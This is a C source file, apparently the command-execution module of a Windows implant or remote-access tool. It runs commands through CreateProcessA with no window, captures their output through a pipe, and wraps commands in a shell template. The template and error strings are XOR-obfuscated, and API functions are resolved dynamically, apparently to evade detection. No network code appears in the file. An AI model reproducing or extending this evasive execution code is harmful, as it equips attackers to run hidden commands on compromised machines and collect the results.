#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "exec.h"
#include "obf.h"
#include "obf_strings.h"
#include "../../include/dynapi.h"

static void run_cmdline(const char *cmd_line, char *out_buf, int buf_size) {
    out_buf[0] = '\0';
    if (!cmd_line || buf_size < 1) return;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    if (!fnCreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return;
    if (!fnSetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
        fnCloseHandle2(hReadPipe);
        fnCloseHandle2(hWritePipe);
        return;
    }

    STARTUPINFOA si = {0};
    si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe; si.hStdError = hWritePipe; si.hStdInput = NULL;

    PROCESS_INFORMATION pi = {0};
    char buf[2048];
    int n = _snprintf(buf, sizeof(buf) - 1, "%s", cmd_line);
    buf[sizeof(buf) - 1] = '\0';
    if (n < 0 || n >= (int)(sizeof(buf) - 1)) {
        fnCloseHandle2(hReadPipe);
        fnCloseHandle2(hWritePipe);
        return;
    }

    BOOL ok = fnCreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);
    fnCloseHandle2(hWritePipe);
    if (!ok) { fnCloseHandle2(hReadPipe); return; }

    DWORD wait_ret = fnWaitForSingleObject(pi.hProcess, 30000);
    DWORD exit_code = STILL_ACTIVE;
    if (wait_ret == WAIT_OBJECT_0)
        fnGetExitCodeProcess(pi.hProcess, &exit_code);
    if (exit_code == STILL_ACTIVE) fnTerminateProcess(pi.hProcess, 1);

    int pos = 0; DWORD bytes_read = 0;
    while (pos < buf_size - 1) {
        BOOL r = fnReadFile(hReadPipe, out_buf + pos,
                          (DWORD)(buf_size - 1 - pos), &bytes_read, NULL);
        if (!r || bytes_read == 0) break;
        pos += (int)bytes_read;
    }
    out_buf[pos] = '\0';
    fnCloseHandle2(pi.hProcess); fnCloseHandle2(pi.hThread); fnCloseHandle2(hReadPipe);
}

void run_command_direct(const char *cmd, char *out_buf, int buf_size) {
    run_cmdline(cmd, out_buf, buf_size);
}

void run_command_shell(const char *cmd, char *out_buf, int buf_size) {
    char buf[2048];
    char _tmpl[ENC_EXEC_SHELL_TMPL_LEN + 1];
    xor_dec(_tmpl, ENC_EXEC_SHELL_TMPL, ENC_EXEC_SHELL_TMPL_LEN);
    int n = _snprintf(buf, sizeof(buf) - 1, _tmpl, cmd);
    buf[sizeof(buf) - 1] = '\0';
    if (n < 0 || n >= (int)(sizeof(buf) - 1)) {
        char _se[ENC_SHELL_ERR_LONG_LEN + 1]; xor_dec(_se, ENC_SHELL_ERR_LONG, ENC_SHELL_ERR_LONG_LEN);
        _snprintf(out_buf, buf_size - 1, "%s", _se);
        if (buf_size > 0) out_buf[buf_size - 1] = '\0';
        return;
    }
    run_cmdline(buf, out_buf, buf_size);
}
